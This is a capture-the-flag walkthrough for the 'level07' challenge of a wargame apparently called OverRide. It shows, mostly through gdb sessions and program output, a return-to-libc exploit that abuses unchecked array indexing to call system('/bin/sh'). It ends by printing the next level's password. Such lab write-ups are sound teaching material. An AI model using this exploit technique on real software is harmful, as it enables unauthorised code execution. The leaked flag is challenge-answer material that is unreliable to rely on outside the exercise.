
# Walkthrough

**Main** : 
This program is a simple command-line utility for storing and reading numbers. It allows the user to perform three primary commands: "store," "read," and "quit.
It demonstrates simple input validation and provides a interface for interacting with the data storage.

**vurability:**
Lack of bounds checking: The program allows users to store numbers in an array (buffer) without performing proper bounds checking. Users can specify an index to store a number, and the program doesn't verify whether the index is within a valid range. This allows for potential buffer overflow or out-of-bounds memory access.

**Solution idea:**
The idea behind this solution is to manipulate the program's memory using the "store" command to store specific addresses at certain indices. By storing the address of the system function at a particular index and the address of "/bin/sh" at another index, the program can be exploited to execute arbitrary shell commands

**Process to exploit :**
>   1. **Find the address**
>   2. **exploit vunerability**



## Step 1
### Find the address
```
 gdb ./level07 
[...]
Input command: ^C
Program received signal SIGINT, Interrupt.
0xf7fdb440 in __kernel_vsyscall ()
(gdb) p &system
$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
(gdb) find __libc_start_main,+9999999,"/bin/sh"
0xf7f897ec
```

 - system()  is  0xf7e6aed0  decimal 4159090384
 -  "/bin/sh" is    0xf7f897ec decimal 4160264172

# Step 2
### Exploit vunerability

The goal is to cause a buffer overflow by using a big index  to overwrite the value stored at that position in the data table. By changing this value in a controlled manner, we can make the Extended Instruction Pointer (EIP) point to a memory address of your choice, such as the address of the system() function, in order to execute arbitrary code.

```
Input command: store
 Number: 1094795585 ; decimal for 0x41414141 or 'AAAA'
 Index: 2147483762
 Completed store command successfully
Input command: quit

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? () 
(gdb) 
```

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384 <--- address of sysem
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4160264172 <--- address of /bin/sh
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$ 

```
